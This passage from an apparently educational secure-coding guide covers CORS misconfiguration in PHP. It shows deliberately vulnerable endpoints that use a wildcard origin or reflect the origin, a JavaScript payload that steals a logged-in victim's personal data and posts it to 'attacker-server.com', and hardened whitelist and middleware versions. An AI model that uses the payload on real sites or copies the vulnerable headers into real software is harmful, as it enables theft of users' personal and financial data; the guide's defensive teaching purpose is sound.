**Additional Protections**:
- **Protocol Enforcement**: Only HTTPS origins allowed in production to prevent downgrade attacks
- **Structured Logging**: JSON logs with request IDs for security incident investigation and SIEM integration
- **Environment Separation**: Development origins only allowed in non-production environments
- **Request Timeouts**: Server timeouts configured to prevent slowloris and connection exhaustion attacks
- **Security Headers**: Additional headers like `X-Content-Type-Options: nosniff` to prevent MIME-type confusion attacks

CORS (Cross-Origin Resource Sharing) must be configured carefully. Many developers make the mistake of allowing all origins or reflecting the origin header, which creates serious security vulnerabilities that attackers can exploit to steal user data.

**VULNERABLE CODE**:

```php
<?php
// api/user_data.php - DANGEROUSLY MISCONFIGURED CORS

// Vulnerability 1: Wildcard origin with credentials
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

session_start();

if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

// Return sensitive user data
$user_id = $_SESSION['user_id'];
$pdo = new PDO('mysql:host=localhost;dbname=app', 'dbuser', 'dbpass');
$stmt = $pdo->prepare('SELECT id, email, phone, ssn_last4, account_balance FROM users WHERE id = ?');
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

header('Content-Type: application/json');
echo json_encode($user);
?>
```

**Another Vulnerable Pattern - Origin Reflection**:

```php
<?php
// api/profile.php - ORIGIN REFLECTION VULNERABILITY

// Dangerous: Reflects any origin back without validation
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
header("Access-Control-Allow-Origin: $origin");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Process authenticated request
session_start();
// ... returns sensitive data
?>
```

**Attack Payload** (Malicious website JavaScript):
```javascript
// Attacker hosts this on evil-site.com
// When authenticated victim visits evil-site.com, their data is stolen

fetch('https://vulnerable-api.com/api/user_data.php', {
    method: 'GET',
    credentials: 'include'  // Sends victim's session cookie
})
.then(response => response.json())
.then(data => {
    // Exfiltrate stolen data to attacker's server
    fetch('https://attacker-server.com/collect', {
        method: 'POST',
        body: JSON.stringify({
            stolen_email: data.email,
            stolen_phone: data.phone,
            stolen_ssn: data.ssn_last4,
            stolen_balance: data.account_balance
        })
    });
});
```

**Why This Is Dangerous**:
- Wildcard origin (`*`) with credentials allows any website to make authenticated requests
- Origin reflection trusts any requesting domain without validation
- Attacker can create a malicious site that steals data from authenticated users
- Session cookies are sent automatically, enabling full account access
- No preflight validation allows immediate data exfiltration

**SECURE VERSION**:

```php
<?php
// api/user_data.php - SECURE CORS CONFIGURATION

class CorsHandler {
    // Whitelist of allowed origins - NEVER use wildcards with credentials
    private const ALLOWED_ORIGINS = [
        'https://app.example.com',
        'https://admin.example.com',
        'https://mobile.example.com'
    ];

    private const ALLOWED_METHODS = ['GET', 'POST', 'OPTIONS'];
    private const ALLOWED_HEADERS = ['Content-Type', 'Authorization', 'X-Requested-With'];
    private const MAX_AGE = 86400; // 24 hours

    public static function handleCors(): bool {
        $origin = $_SERVER['HTTP_ORIGIN'] ?? '';

        // Validate origin against strict whitelist
        if (!in_array($origin, self::ALLOWED_ORIGINS, true)) {
            // Log rejected CORS attempt for security monitoring
            error_log(sprintf(
                "CORS_REJECTED: origin=%s ip=%s uri=%s",
                $origin,
                $_SERVER['REMOTE_ADDR'],
                $_SERVER['REQUEST_URI']
            ));
            return false;
        }

        // Set CORS headers only for whitelisted origins
        header("Access-Control-Allow-Origin: $origin");
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Allow-Methods: ' . implode(', ', self::ALLOWED_METHODS));
        header('Access-Control-Allow-Headers: ' . implode(', ', self::ALLOWED_HEADERS));
        header('Access-Control-Max-Age: ' . self::MAX_AGE);
        header('Vary: Origin'); // Critical for caching

        // Handle preflight requests
        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            http_response_code(204);
            exit;
        }

        return true;
    }
}

// Apply CORS handling
if (!CorsHandler::handleCors()) {
    http_response_code(403);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Origin not allowed']);
    exit;
}

// Continue with authenticated request handling
session_start();

if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

$user_id = $_SESSION['user_id'];
$pdo = new PDO('mysql:host=localhost;dbname=app', 'dbuser', 'dbpass');
$stmt = $pdo->prepare('SELECT id, email, phone FROM users WHERE id = ?');
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

header('Content-Type: application/json');
echo json_encode($user);
?>
```

**Key Security Controls**:
- **Strict origin whitelist**: Only explicitly allowed domains can make cross-origin requests
- **No wildcard with credentials**: Never combine `*` origin with `Access-Control-Allow-Credentials: true`
- **Vary header**: Prevents cache poisoning by ensuring responses vary by origin
- **Security logging**: Failed CORS attempts are logged for monitoring and alerting
- **Preflight handling**: OPTIONS requests are handled securely before data access

Dynamic subdomain validation is a common requirement for multi-tenant applications, but it's also where many CORS misconfigurations happen. You need strict pattern matching that can't be bypassed by attackers registering similar domains.

**PRODUCTION PATTERN**:

```php
<?php
// src/Security/CorsMiddleware.php

declare(strict_types=1);

namespace App\Security;

use Psr\Log\LoggerInterface;

class CorsMiddleware {
    private LoggerInterface $logger;
    private array $config;

    // Production CORS configuration
    private const DEFAULT_CONFIG = [
        'allowed_origins' => [
            'https://app.example.com',
            'https://admin.example.com'
        ],
        'allowed_origin_patterns' => [
            // Regex patterns for dynamic subdomains
            // CRITICAL: Use anchors (^ and $) to prevent bypass
            '/^https:\/\/[a-z0-9-]+\.myapp\.com$/',
            '/^https:\/\/[a-z0-9-]+\.staging\.myapp\.com$/'
        ],
        'blocked_subdomains' => [
            'admin', 'api', 'mail', 'ftp', 'www'
        ],
        'allowed_methods' => ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        'allowed_headers' => ['Content-Type', 'Authorization', 'X-Request-ID'],
        'exposed_headers' => ['X-Request-ID', 'X-RateLimit-Remaining'],
        'max_age' => 86400,
        'allow_credentials' => true
    ];

    public function __construct(LoggerInterface $logger, array $config = []) {
        $this->logger = $logger;
        $this->config = array_merge(self::DEFAULT_CONFIG, $config);
    }

    public function handle(): CorsResult {
        $origin = $this->getOrigin();

        if (empty($origin)) {
            return new CorsResult(true, null); // Same-origin request
        }

        // Check if origin is allowed
        $validationResult = $this->validateOrigin($origin);

        if (!$validationResult->isAllowed()) {
            $this->logSecurityEvent('cors_rejected', [
                'origin' => $origin,
                'reason' => $validationResult->getReason(),
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
                'uri' => $_SERVER['REQUEST_URI'] ?? 'unknown'
            ]);

            return $validationResult;
        }

        // Set CORS headers for valid origin
        $this->setCorsHeaders($origin);

        // Handle preflight
        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            $this->handlePreflight();
        }

        return $validationResult;
    }

    private function validateOrigin(string $origin): CorsResult {
        // Parse and validate origin URL structure
        $parsed = parse_url($origin);

        if ($parsed === false || !isset($parsed['scheme'], $parsed['host'])) {
            return new CorsResult(false, null, 'Invalid origin format');
        }

        // SECURITY: Only allow HTTPS in production
        if ($parsed['scheme'] !== 'https') {
            return new CorsResult(false, null, 'HTTPS required');
        }

        // SECURITY: Check for port smuggling attempts
        if (isset($parsed['port'])) {
            return new CorsResult(false, null, 'Non-standard port not allowed');
        }

        // Check exact match first (fastest)
        if (in_array($origin, $this->config['allowed_origins'], true)) {
            return new CorsResult(true, $origin);
        }

        // Check pattern match for dynamic subdomains
        foreach ($this->config['allowed_origin_patterns'] as $pattern) {
            if (preg_match($pattern, $origin) === 1) {
                // Additional subdomain validation
                if ($this->isBlockedSubdomain($parsed['host'])) {
                    return new CorsResult(false, null, 'Blocked subdomain');
                }

                // Validate subdomain format
                if (!$this->isValidSubdomainFormat($parsed['host'])) {
                    return new CorsResult(false, null, 'Invalid subdomain format');
                }

                return new CorsResult(true, $origin);
            }
        }

        return new CorsResult(false, null, 'Origin not in whitelist');
    }

    private function isBlockedSubdomain(string $host): bool {
        $parts = explode('.', $host);
        $subdomain = $parts[0] ?? '';

        return in_array(strtolower($subdomain), $this->config['blocked_subdomains'], true);
    }

    private function isValidSubdomainFormat(string $host): bool {
        $parts = explode('.', $host);
        $subdomain = $parts[0] ?? '';

        // Subdomain must be 3-63 chars, alphanumeric with hyphens
        // Cannot start or end with hyphen
        if (strlen($subdomain) < 3 || strlen($subdomain) > 63) {
            return false;
        }

        if (!preg_match('/^[a-z0-9][a-z0-9-]*[a-z0-9]$/', $subdomain)) {
            return false;
        }

        // Prevent consecutive hyphens (potential bypass)
        if (strpos($subdomain, '--') !== false) {
            return false;
        }

        return true;
    }

    private function setCorsHeaders(string $origin): void {
        header("Access-Control-Allow-Origin: {$origin}");
        header('Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers');

        if ($this->config['allow_credentials']) {
            header('Access-Control-Allow-Credentials: true');
        }

        if (!empty($this->config['exposed_headers'])) {
            header('Access-Control-Expose-Headers: ' . implode(', ', $this->config['exposed_headers']));
        }
    }

    private function handlePreflight(): void {
        header('Access-Control-Allow-Methods: ' . implode(', ', $this->config['allowed_methods']));
        header('Access-Control-Allow-Headers: ' . implode(', ', $this->config['allowed_headers']));
        header('Access-Control-Max-Age: ' . $this->config['max_age']);

        http_response_code(204);
        exit;
    }

    private function getOrigin(): ?string {
        return $_SERVER['HTTP_ORIGIN'] ?? null;
    }

    private function logSecurityEvent(string $event, array $context): void {
        $this->logger->warning("[SECURITY] {$event}", $context);

        // Send to SIEM/monitoring in production
        if (getenv('APP_ENV') === 'production') {
            $this->sendToSecurityMonitoring($event, $context);
        }
    }

    private function sendToSecurityMonitoring(string $event, array $context): void {
        // Integration with security monitoring (e.g., Splunk, DataDog)
        // Implementation depends on your monitoring stack
    }
}

class CorsResult {
    private bool $allowed;
    private ?string $origin;
    private ?string $reason;

    public function __construct(bool $allowed, ?string $origin, ?string $reason = null) {
        $this->allowed = $allowed;
        $this->origin = $origin;
        $this->reason = $reason;
    }

    public function isAllowed(): bool {
        return $this->allowed;
    }

    public function getOrigin(): ?string {
        return $this->origin;
    }

    public function getReason(): ?string {
        return $this->reason;
    }
}
?>
```

